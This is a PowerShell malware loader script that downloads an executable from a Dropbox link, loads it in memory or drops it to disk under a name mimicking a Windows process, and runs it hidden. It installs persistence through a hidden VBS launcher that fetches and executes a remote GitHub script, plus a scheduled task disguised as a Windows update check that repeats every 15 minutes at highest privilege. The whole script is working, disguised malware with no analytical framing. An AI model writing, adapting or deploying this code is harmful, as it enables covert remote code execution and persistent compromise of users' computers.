# ==========================================
# FINAL ZERO-FLASH LOADER (VBS + HYBRID)
# ==========================================

$PayloadUrl = 'https://www.dropbox.com/scl/fi/x6s38mn7hyakminmivyqz/WmiPrvSE.exe?rlkey=3dimz2btxhy6p1x27oh10ghxn&st=ydc48ph3&dl=1'
$GitHubUrl  = 'https://github.com/bibkbkbkibjb-dev/ss/raw/refs/heads/main/deploy%20invisible.ps1'
$TaskName   = "WindowsUpdateCheck"

# --- 1. CLEANUP ---
try {
    Remove-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SysDeploy" -ErrorAction SilentlyContinue
    Remove-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SysDeploy" -ErrorAction SilentlyContinue
    Stop-Process -Name "mshta" -Force -ErrorAction SilentlyContinue
    Unregister-ScheduledTask -TaskName "MicrosoftWindowsUpdater" -Confirm:$false -ErrorAction SilentlyContinue
} catch {}

# --- 2. EXECUTION (Smart Load) ---
function Run-Payload {
    try {
        $bytes = (New-Object Net.WebClient).DownloadData($PayloadUrl)
    } catch { return }

    # Try RAM
    try {
        $assembly = [System.AppDomain]::CurrentDomain.Load($bytes)
        $assembly.EntryPoint.Invoke($null, $null)
        return
    } catch {}

    # Try Disk
    try {
        $path = "$env:APPDATA\Microsoft\Windows\Templates\SearchIndexer.exe"
        [IO.File]::WriteAllBytes($path, $bytes)
        Start-Process $path -WindowStyle Hidden
    } catch {}
}

# --- 3. ZERO-FLASH PERSISTENCE (VBS Wrapper) ---
try {
    # A. Create the Invisible VBS Launcher
    $vbsPath = "$env:APPDATA\Microsoft\Windows\Templates\win_service.vbs"
    $psCmd = "powershell -NoProfile -ExecutionPolicy Bypass -Command ""iwr '$GitHubUrl' | iex"""
    
    # This VBS script runs the command with '0' (vbHide) -> NO WINDOW EVER.
    $vbsContent = @"
Set WshShell = CreateObject("WScript.Shell") 
WshShell.Run "$psCmd", 0, False
"@
    Set-Content -Path $vbsPath -Value $vbsContent -Force

    # B. Create Task pointing to WSCRIPT (Not PowerShell)
    $exists = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
    if ($true) {
        # Action: Run wscript.exe "path\to.vbs"
        $Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$vbsPath`""
        
        $Trigger1 = New-ScheduledTaskTrigger -AtLogon
        $Trigger2 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 15)
        $Trigger2.Repetition.Duration = [TimeSpan]::MaxValue
        
        $Principal = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Users" -RunLevel Highest
        $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -MultipleInstances Parallel
        
        Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger @($Trigger1, $Trigger2) -Principal $Principal -Settings $Settings -Force | Out-Null
        Write-Host "✅ Zero-Flash Persistence Installed." -F Green
    }
} catch {
    Write-Host "⚠️ Persistence Failed" -F Red
}

# --- 4. START ---
Run-Payload
